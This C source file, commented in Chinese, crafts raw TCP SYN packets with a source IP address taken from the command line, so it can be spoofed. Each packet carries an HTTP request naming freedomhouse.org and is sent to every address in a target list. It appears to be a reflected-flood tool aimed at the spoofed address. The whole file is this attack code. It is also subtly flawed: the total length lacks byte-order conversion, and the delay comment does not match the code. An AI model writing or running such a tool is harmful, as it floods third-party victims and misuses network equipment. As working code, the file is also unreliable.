#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>

// 计算校验和
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <source_ip> <source_port> <target_file>\n", argv[0]);
        return 1;
    }

    char *source_ip = argv[1];
    int source_port = atoi(argv[2]);
    char *target_file = argv[3];

    FILE *file = fopen(target_file, "r");
    if (!file) {
        perror("File open failed");
        return 1;
    }

    char target_ip[16];
    while (fgets(target_ip, sizeof(target_ip), file)) {
        // 去除 IP 地址末尾的换行符
        target_ip[strcspn(target_ip, "\r\n")] = 0;

        int sockfd;
        struct sockaddr_in dest;
        struct iphdr iph;
        struct tcphdr tcph;
        char packet[4096];

        // 创建原始套接字
        sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sockfd < 0) {
            perror("Socket creation failed");
            continue;
        }

        // 填充 IP 头部
        memset(&iph, 0, sizeof(iph));
        iph.ihl = 5;
        iph.version = 4;
        iph.tos = 0;
        iph.tot_len = sizeof(iph) + sizeof(tcph) + strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"); // 总长度
        iph.id = htons(54321);
        iph.frag_off = 0;
        iph.ttl = 255;
        iph.protocol = IPPROTO_TCP; // TCP 协议
        iph.check = 0; // 校验和暂时设置为0，稍后计算
        iph.saddr = inet_addr(source_ip); // 源 IP 地址
        iph.daddr = inet_addr(target_ip); // 目标 IP 地址

        // IP 头部校验和
        iph.check = checksum((unsigned short *)&iph, sizeof(iph));

        // 填充 TCP 头部
        memset(&tcph, 0, sizeof(tcph));
        tcph.source = htons(source_port); // 源端口
        tcph.dest = htons(80); // 目标端口
        tcph.seq = htonl(rand() % (UINT32_MAX - 100000) + 100000); // 随机序列号
        tcph.ack_seq = 0; // 不需要确认号
        tcph.doff = 5; // TCP 头部长度
        tcph.syn = 1; // SYN 标志
        tcph.window = htons(65535); // 最大窗口大小
        tcph.check = 0; // 校验和将通过伪头部计算
        tcph.urg_ptr = 0;

        // 填充伪头部
        struct pseudo_header {
            u_int32_t source_address;
            u_int32_t dest_address;
            u_int8_t placeholder;
            u_int8_t protocol;
            u_int16_t tcp_length;
        } psh;

        memset(&psh, 0, sizeof(psh));
        psh.source_address = inet_addr(source_ip);
        psh.dest_address = inet_addr(target_ip);
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(tcph) + strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));

        // 计算 TCP 校验和
        int psize = sizeof(psh) + sizeof(tcph) + strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n");
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char *)&psh, sizeof(psh));
        memcpy(pseudogram + sizeof(psh), &tcph, sizeof(tcph));
        memcpy(pseudogram + sizeof(psh) + sizeof(tcph), "GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n", strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));
        tcph.check = checksum((unsigned short *)pseudogram, psize);
        free(pseudogram);

        // 创建数据包
        memset(packet, 0, 4096);
        memcpy(packet, &iph, sizeof(iph));
        memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
        memcpy(packet + sizeof(iph) + sizeof(tcph), "GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n", strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));

        // 目标地址
        dest.sin_family = AF_INET;
        dest.sin_port = htons(80); // 目标端口
        dest.sin_addr.s_addr = iph.daddr;

        // 发送数据包
        if (sendto(sockfd, packet, iph.tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Send failed");
        }

        // 增加 10 毫秒延迟
        usleep(1);

        close(sockfd);
    }

    fclose(file);
    return 0;
}
